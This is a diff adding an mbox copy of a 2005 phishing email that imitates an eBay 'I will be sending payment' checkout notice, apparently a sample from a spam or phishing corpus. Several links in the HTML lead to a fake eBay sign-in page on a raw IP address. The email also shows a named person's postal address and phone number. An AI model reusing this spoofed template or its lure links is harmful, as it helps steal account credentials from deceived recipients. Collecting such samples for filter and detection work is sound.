@@ -1,0 +1,354 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id ADA972A88C
+ for <user@example.com>; Mon,  7 Nov 2005 04:13:50 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+ id A43EB621C9E; Mon,  7 Nov 2005 04:13:50 -0500 (EST)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 634BF621C89
+ for <user@example.com>; Mon,  7 Nov 2005 04:13:50 -0500 (EST)
+Received: (from user@localhost) by mail.example.com id EAA17822
+ for user@example.com; Mon, 7 Nov 2005 04:13:50 -0500
+Received: from lsh162.siteprotect.com (lsh162.siteprotect.com [66.113.130.178])
+ by mail.example.com with ESMTP id EAA17814
+ for <user@biochemistry.BIOC.cwru.edu>; Mon, 7 Nov 2005 04:13:49 -0500
+Received: (from euoammaimare@localhost)
+ by lsh162.siteprotect.com (8.11.6/8.11.6) id jA79Dnl11013;
+ Mon, 7 Nov 2005 03:13:49 -0600
+Date: Mon, 7 Nov 2005 03:13:49 -0600
+Message-Id: <200511070913.jA79Dnl11013@lsh162.siteprotect.com>
+To: user@biochemistry.BIOC.cwru.edu
+Subject: I will be sending payment of US $25.76 shortly for eBay item
+ #6069508933, (1B+1C) HP 3820 V40 940c 5110 PSC 750 950 INK CARTRIDGE
+From: <checkout@ebay.com>
+Content-Type: text/html
+X-Priority: 3
+Content-Length: 16132
+Lines: 319
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 232
+
+
+<html><head>
+<table cellpadding="0" cellspacing="0" width="600">
+<tr>
+<td width="600" style="word-wrap: break-word;"><table cellpadding="2" cellspacing="0" border="0" bgcolor="#D6DCFE" width="100%" xmlns:x="urn:schemas-microsoft-com:xslt" xmlns:ebay="eBayV3" xmlns:co="CheckoutV3">
+<tr>
+<td><a href="http://www.ebay.com/" target="_blank"><img src="http://pics.ebaystatic.com/aw/pics/email/eBayLogo.gif" border="0" align="right"></a><font size="3" face="Arial, Verdana"><b>I will be sending payment of US $25.76 for my item.</b></font>
+</td>
+</tr>
+<tr bgcolor="#9999CC" height="2">
+<td></td>
+</tr>
+</table>
+<table cellpadding="0" cellspacing="0" width="100%" border="0" xmlns:x="urn:schemas-microsoft-com:xslt">
+<tr>
+<td><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="25"></td>
+</tr>
+</table>
+<br><font face="Arial, Verdana" size="2" xmlns:x="urn:schemas-microsoft-com:xslt">I will be sending payment of <font style="font-size: x-small; font-family: arial, sans-serif; font-weight:bold">US $25.76</font> via <font style="font-size: x-small; font-family: arial, sans-serif; font-weight:bold">Credit Cards</font> shortly.  </font><br xmlns:x="urn:schemas-microsoft-com:xslt"><br><font face="Arial, Verdana" size="2" xmlns:x="urn:schemas-microsoft-com:xslt"></font>
+<table cellpadding="0" cellspacing="0" border="0" width="100%" xmlns:x="urn:schemas-microsoft-com:xslt">
+<tr>
+<td colspan="2"><IMG height="15" alt=" " src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1"></td>
+</tr>
+<tr>
+<td colspan="2" align="center">
+<table cellpadding="5" cellspacing="0" width="80%" border="1">
+<tr>
+<td align="center">
+<font face="Arial, Verdana" style="font-size: x-small; font-family: arial, sans-serif; font-weight:bold" size="2">Print postage for this shipment online</font>
+</td>
+</tr>
+<tr>
+<td align="center">
+<font face="Arial, Verdana" size="2">You can easily print postage or a label for US Postal Service and UPS.</font><br><br><a href="http://81.196.121.160/ws/aw/cgi/eBayISAPI.php?SignIn&ssPageName=h:h:sin:US" target="_blank"><img src="http://pics.ebaystatic.com/aw/pics/shippingcalculator/printShippingLabels.gif" alt="Print Shipping Label" border="0" vspace="3"></a></td>
+</tr>
+</table>
+</td>
+</tr>
+</table><br xmlns:x="urn:schemas-microsoft-com:xslt"><table cellpadding="0" cellspacing="0" width="100%" border="0" xmlns:x="urn:schemas-microsoft-com:xslt">
+<tr>
+<td><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="10"></td>
+</tr>
+</table>
+<table cellpadding="2" cellspacing="0" width="600" border="0" bgcolor="#D2D3D2" style="word-wrap:normal;" xmlns:x="urn:schemas-microsoft-com:xslt">
+<tr>
+<td>
+<table cellpadding="0" cellspacing="0" width="100%" border="0">
+<tr>
+<td>
+<table cellpadding="0" cellspacing="0" border="0" width="100%" bgcolor="#FFFFFF">
+<tr bgcolor="#EFEFEF">
+<td width="15"><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="15" height="1"></td>
+<td width="105">
+<font size="2" face="Arial, Verdana"><b>Item #</b></font>
+</td>
+<td width="365">
+<font size="2" face="Arial, Verdana"><b>Item Title</b></font>
+</td>
+<td width="40" nowrap>
+<font size="2" face="Arial, Verdana"><b>Qty.</b></font>
+</td>
+<td width="30"><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="30" height="1"></td>
+<td width="35" nowrap>
+<font size="2" face="Arial, Verdana"><b>Price</b></font>
+</td>
+<td width="15"><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="15" height="1"></td>
+</tr>
+<tr>
+<td><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="15" height="1"></td>
+<td>
+<font size="2" face="Arial, Verdana" height="15">6069508933</font>
+</td>
+<td>
+<font size="2" face="Arial, Verdana" height="15"><a href="http://81.196.121.160/ws/aw/cgi/eBayISAPI.php?SignIn&ssPageName=h:h:sin:US" target="_blank">(1B+1C) HP 3820 V40 940c 5110 PSC 750 950 INK CARTRIDGE</a></font>
+</td>
+<td align="right" height="15" nowrap>
+<font size="2" face="Arial, Verdana">1</font>
+</td>
+<td><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="30" height="1"></td>
+<td align="right" height="15" nowrap>
+<font size="2" face="Arial, Verdana">US $19.81</font>
+</td>
+<td width="15"><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="15" height="1"></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+<table width="600" border="0" cellpadding="0" cellspacing="0" xmlns:x="urn:schemas-microsoft-com:xslt">
+<tr>
+<td align="right" width="600">
+<table border="0" cellpadding="0" cellspacing="0" width="600">
+<tr>
+<td width="15"><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="15" height="1" border="0" alt=" "></td>
+<td width="499"></td>
+<td width="10"><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="10" height="1" border="0" alt=" "></td>
+<td width="1" bgcolor="#FFFFFF"><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="1" border="0" alt=" "></td>
+<td width="80"><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="80" height="1" border="0" alt=" "></td>
+<td width="15"><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="15" height="1" border="0" alt=" "></td>
+<td width="12"><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="12" height="1" border="0" alt=" "></td>
+</tr>
+<tr height="25">
+<td><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="1" border="0" alt=" "></td>
+<td colspan="2" align="right"><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="17" border="0" alt=" "><FONT FACE="Arial, Verdana" SIZE="2">Subtotal:</FONT>
+</td>
+<td bgcolor="#FFFFFF"><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="1" border="0" alt=" "></td>
+<td align="right" nowrap colspan="2">
+<font face="Arial, Verdana" size="2">US $19.81</font>
+</td>
+<td><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="1" border="0" alt=" "></td>
+</tr>
+<tr>
+<td><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="1" border="0" alt=" "></td>
+<td colspan="2" align="right">
+<font size="2" face="Arial, Verdana">
+<table cellpadding="0" cellspacing="0" width="100%">
+<tr>
+<td align="right">
+<font face="Arial, Verdana" size="2">Shipping and handling via Standard Flat Rate Shipping Service<font size="1" color="#666666"></font>:
+							</font>
+</td>
+</tr>
+</table>
+</font>
+</td>
+<td bgcolor="#FFFFFF"><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="1" border="0" alt=" "></td>
+<td align="right" valign="bottom" colspan="2">
+<font face="Arial, Verdana" size="2">US $5.95</font>
+</td>
+<td><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="1" border="0" alt=" "></td>
+</tr>
+<tr>
+<td><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="1" border="0" alt=" "></td>
+<td colspan="2" align="right">
+<font size="2" face="Arial, Verdana">Shipping insurance <font size="1" face="Arial, Verdana">(not offered)</font>:</font>
+</td>
+<td bgcolor="#FFFFFF"><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="1" border="0" alt=" "></td>
+<td align="right" valign="top" nowrap colspan="2">
+<font size="2" face="Arial, Verdana">--</font>
+</td>
+<td><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="1" border="0" alt=" "></td>
+</tr>
+<tr>
+<td bgcolor="#999999"><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="1" border="0" alt=" "></td>
+<td colspan="2" valign="bottom" bgcolor="#999999"><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="1" border="0" alt=" "></td>
+<td bgcolor="#FFFFFF"><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="1" border="0" alt=" "></td>
+<td colspan="2" valign="bottom" bgcolor="#999999"><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="1" border="0" alt=" "></td>
+<td><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="1" border="0" alt=" "></td>
+</tr>
+<tr height="25">
+<td bgcolor="#FFFFFF"><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="1" border="0" alt=" "></td>
+<td colspan="2" align="right" bgcolor="#FFFFFF">
+<font face="Arial, Verdana" size="2"><b>Total:</b></font>
+</td>
+<td bgcolor="#FFFFFF"><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="1" border="0" alt=" "></td>
+<td align="right" colspan="2">
+<font face="Arial, Verdana" size="2"><b>US $25.76</b></font>
+</td>
+<td><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="1" border="0" alt=" "></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+<table cellpadding="0" cellspacing="0" width="100%" border="0" xmlns:x="urn:schemas-microsoft-com:xslt">
+<tr>
+<td><b><font size="2" face="Arial, Verdana">Please ship to the following address:	</font></b></td>
+</tr>
+</table>
+<table cellpadding="0" cellspacing="0" width="100%" border="0" xmlns:msxsl="urn:schemas-microsoft-com:xslt">
+<tr>
+<td colspan="2">
+<font size="2" face="Arial, Verdana">FRANCISCO ORLANDO</font>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<font size="2" face="Arial, Verdana">60 ALPINE LAKE</font>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<font size="2" face="Arial, Verdana">HENRYVILLE, PA 18332</font>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<font size="2" face="Arial, Verdana">United States</font>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<font size="2" face="Arial, Verdana">(570) 619-2204</font>
+</td>
+</tr>
+</table>
+<table cellpadding="0" cellspacing="0" width="100%" border="0" xmlns:x="urn:schemas-microsoft-com:xslt">
+<tr>
+<td><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="15"></td>
+</tr>
+</table>
+<table cellpadding="0" cellspacing="0" width="100%" border="0" xmlns:x="urn:schemas-microsoft-com:xslt">
+<tr>
+<td><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="5"></td>
+</tr>
+</table>
+<table cellpadding="0" cellspacing="0" width="100%" border="0" xmlns:x="urn:schemas-microsoft-com:xslt">
+<tr>
+<td><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="15"></td>
+</tr>
+</table>
+<table cellpadding="0" cellspacing="0" width="100%" border="0" xmlns:x="urn:schemas-microsoft-com:xslt">
+<tr>
+<td>
+<font size="2" face="Arial, Verdana">Thank you.</font>
+</td>
+</tr>
+<tr>
+<td colspan="2"><IMG height="20" alt=" " src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1"></td>
+</tr>
+<tr>
+<td><b><font size="2" face="Arial, Verdana">fajardo136</font></b></td>
+</tr>
+</table>
+<table cellpadding="0" cellspacing="0" width="100%" border="0" xmlns:x="urn:schemas-microsoft-com:xslt">
+<tr>
+<td><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="7"></td>
+</tr>
+</table>
+<table cellpadding="0" cellspacing="0" width="600" border="0" xmlns:x="urn:schemas-microsoft-com:xslt">
+<tr>
+<td colspan="2" bgcolor="#CCCCCC"></td>
+</tr>
+<tr>
+<td colspan="2"><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="10"></td>
+</tr>
+<tr>
+<td width="50%">
+<font style="font-size: x-small; font-family: arial, sans-serif; font-weight:bold">Helpful links</font>
+<table cellpadding="0" cellspacing="0" border="0">
+<tr valign="top">
+<td>
+<font size="2" face="Arial, Verdana" xmlns:ebay="eBayV3" xmlns:co="CheckoutV3"><a href="http://81.196.121.160/ws/aw/cgi/eBayISAPI.php?SignIn&ssPageName=h:h:sin:US" target="_blank">Payment Status</a> - </font>
+<font size="2" face="Arial, Verdana" xmlns:ebay="eBayV3" xmlns:co="CheckoutV3">See the details for this purchase</font><br xmlns:ebay="eBayV3" xmlns:co="CheckoutV3"><font size="2" face="Arial, Verdana" xmlns:ebay="eBayV3" xmlns:co="CheckoutV3"><a href="http://81.196.121.160/ws/aw/cgi/eBayISAPI.php?SignIn&ssPageName=h:h:sin:US" target="_blank">Leave feedback</a> - </font>
+<font size="2" face="Arial, Verdana" xmlns:ebay="eBayV3" xmlns:co="CheckoutV3">Tell us how the sale went</font><br xmlns:ebay="eBayV3" xmlns:co="CheckoutV3"><font size="2" face="Arial, Verdana" xmlns:ebay="eBayV3" xmlns:co="CheckoutV3"><a href="http://81.196.121.160/ws/aw/cgi/eBayISAPI.php?SignIn&ssPageName=h:h:sin:US" target="_blank">Contact Information</a> - </font>
+<font size="2" face="Arial, Verdana" xmlns:ebay="eBayV3" xmlns:co="CheckoutV3">Exchange contact details</font><br xmlns:ebay="eBayV3" xmlns:co="CheckoutV3"><font size="2" face="Arial, Verdana" xmlns:ebay="eBayV3" xmlns:co="CheckoutV3"><a href="http://81.196.121.160/ws/aw/cgi/eBayISAPI.php?SignIn&ssPageName=h:h:sin:US" target="_blank">My eBay</a> - </font>
+<font size="2" face="Arial, Verdana" xmlns:ebay="eBayV3" xmlns:co="CheckoutV3">Track your buying and selling activity</font><br xmlns:ebay="eBayV3" xmlns:co="CheckoutV3"><font size="2" face="Arial, Verdana" xmlns:ebay="eBayV3" xmlns:co="CheckoutV3"><a href="http://pages.ebay.com/help/index.html" target="_blank">eBay Help</a> - </font>
+<font size="2" face="Arial, Verdana" xmlns:ebay="eBayV3" xmlns:co="CheckoutV3">Find answers to your questions</font><br xmlns:ebay="eBayV3" xmlns:co="CheckoutV3"></td>
+</tr>
+</table>
+</td>
+<td width="50%" align="right">
+<table cellpadding="0" cellspacing="0" border="0">
+<tr valign="top">
+<td>
+<table cellpadding="3" cellspacing="5" border="0" bgcolor="#FFFFCC" width="260">
+<tr>
+<td>
+<font size="2" face="Arial, Verdana"><img src="http://pics.ebaystatic.com/aw/pics/checkout/mipicon_shipping_33x19.gif"><b> Increase sales by offering a shipping discount.</b>
+Encourage your buyers by offering them a shipping discount when they purchase more than one item.
+<a href="http://payments.ebay.com/ws/eBayISAPI.dll?SoldGlobalPreferences&amp;mode=0" target="_blank">Specify a shipping discount now.</a></font>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+<tr>
+<td colspan="2"><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="10"></td>
+</tr>
+<tr>
+<td colspan="2" bgcolor="#CCCCCC"></td>
+</tr>
+</table>
+<table cellpadding="0" cellspacing="0" width="100%" border="0" xmlns:x="urn:schemas-microsoft-com:xslt">
+<tr>
+<td><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="5"></td>
+</tr>
+</table>
+<table cellpadding="0" cellspacing="0" border="0" width="600" xmlns:x="urn:schemas-microsoft-com:xslt">
+<tr>
+<td valign="top">
+<font face="Arial" size="1" color="#666666">eBay treats your personal information with the utmost care, and our Privacy Policy is designed to protect you and your information. eBay will never ask their users for personal information, such as bank account numbers, credit card numbers, pin numbers, passwords, or Social Security numbers in an email. For more information on how to protect your eBay password and your account, please visit <a href="http://pages.ebay.com/help/newtoebay/account_protection.html" target="_blank">User Account Protection</a>.</font>
+</td>
+</tr>
+<tr>
+<td><IMG height="15" alt=" " src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1"></td>
+</tr>
+<tr>
+<td>
+<font face="Arial" size="1" color="#666666">This eBay notice was sent <a href="mailto:" target="_blank"></a>
+based on your eBay account preferences and in accordance with our <a href="http://pages.ebay.com/help/community/png-priv.html" target="_blank">Privacy Policy</a>. To change your notification preferences, <a href="http://cgi4.ebay.com/ws/eBayISAPI.dll?OptinLoginShow" target="_blank">click here</a>. If you would like to receive this email in text format, <a href="http://cgi4.ebay.com/ws/eBayISAPI.dll?OptinLoginShow" target="_blank">click here</a>.</font>
+</td>
+</tr>
+</table>
+<table cellpadding="0" cellspacing="0" width="100%" border="0" xmlns:x="urn:schemas-microsoft-com:xslt">
+<tr>
+<td><img src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width="1" height="15"></td>
+</tr>
+</table>
+<table cellpadding="0" cellspacing="0" border="0" width="600" xmlns:x="urn:schemas-microsoft-com:xslt">
+<tr>
+<td valign="top" align="center">
+<p align="center">
+<font face="Arial" size="1" color="#666666">
+Copyright © 1995-2005 eBay Inc. All Rights Reserved. <br>Designated trademarks and brands are the property of their respective owners.<br>eBay and the eBay logo are trademarks of eBay Inc.</font>
+</p>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</body></html>
